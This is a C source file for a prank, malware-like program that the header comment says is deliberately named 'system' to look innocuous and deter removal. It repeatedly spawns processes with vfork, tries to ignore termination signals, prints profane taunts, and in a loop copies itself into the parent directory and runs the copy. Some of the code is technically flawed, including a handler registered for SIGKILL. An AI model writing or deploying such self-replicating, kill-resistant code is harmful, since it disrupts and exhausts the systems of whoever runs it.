/**
 * named system so that when you kill
 * or remove it you might accidentally
 * kill or remove something important
 * like systemd or whatever and so
 * it also sounds innocuous and you
 * don't know what it does
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/signal.h>
#include <unistd.h>

void handler() {
    /**
     * Helper procedure prints annoying message
     */
    printf("\033[0;31mYou talkin' to me motherfucker?\033[0m\n");
    printf("\033[0;31mBecause I ain't listening!\033[0m\n");
}

int main() {
    /**
     * Run with new PID using vfork()
     * Each parent spawns a child
     * Each child becomes a parent in turn
     * Parent waits unless child is killed
     * Each parent is awakened when it's child is killed
     * If parent is awakened, it spawns a new child
     * Starting a new bloodline to avenge the killed child
     * The more children you kill, the faster you get forked
     * Processes handle signals by ignoring them and swearing
     * Copy program file into parent directory and bin
     * Run copied program
     */
    printf("Hello, Word! ");
    fflush(stdout);
    sleep(1);
    printf("Lets play a game! ");
    fflush(stdout);
    sleep(1);
    for (int i = 1; !vfork(); ++i) {
        signal(SIGHUP, handler);
        signal(SIGINT, handler);
        signal(SIGQUIT, handler);
        signal(SIGILL, handler);
        signal(SIGTRAP, handler);
        signal(SIGABRT, handler);
        signal(SIGKILL, handler);
        signal(SIGSEGV, handler);
        signal(SIGPIPE, handler);
        signal(SIGALRM, handler);
        signal(SIGTERM, handler);
        printf("I'm new process number ");
        printf("%i", i);
        printf("! ");
        fflush(stdout);
        sleep(1);
        printf("You can't kill me! ");
        fflush(stdout);
        sleep(1);
    }
    printf("\033[0;31m*CHILD KILLED*\033[0m");
    fflush(stdout);
    sleep(2);
    printf("\033[0;31m*PARENT AWAKENED*\033[0m\n");
    fflush(stdout);
    sleep(2);
    printf("\033[0;31m\tLEAVE MY SON ALONE!\033[0m\n");
    fflush(stdout);
    sleep(2);
    printf("\033[0;31mCREATING NEW BLOODLINE.\033[0m");
    fflush(stdout);
    sleep(2);
    printf("\033[0;31m.\033[0m");
    fflush(stdout);
    sleep(2);
    printf("\033[0;31m..\033[0m\n");
    fflush(stdout);
    sleep(2);
    printf("\033[0;31mYOU'VE STARTED A BLOOD FEUD!\033[0m\n");
    fflush(stdout);
    sleep(2);
    while (!vfork()) {
        signal(SIGHUP, handler);
        signal(SIGINT, handler);
        signal(SIGQUIT, handler);
        signal(SIGILL, handler);
        signal(SIGTRAP, handler);
        signal(SIGABRT, handler);
        signal(SIGKILL, handler);
        signal(SIGSEGV, handler);
        signal(SIGPIPE, handler);
        signal(SIGALRM, handler);
        signal(SIGTERM, handler);
        printf("\033[0;31mI'M HERE TO AVENGE MY FALLEN BROTHER!\033[0m\n");
        fflush(stdout);
        sleep(1);
        printf("Get fucked! ");
        fflush(stdout);
        sleep(1);
        printf("My daddy can beat your daddy up!\n");
        fflush(stdout);
        sleep(1);
        system("cp ./system ../system &"
               "cd .. &"
               "./system &");
        sleep(1);
    }
}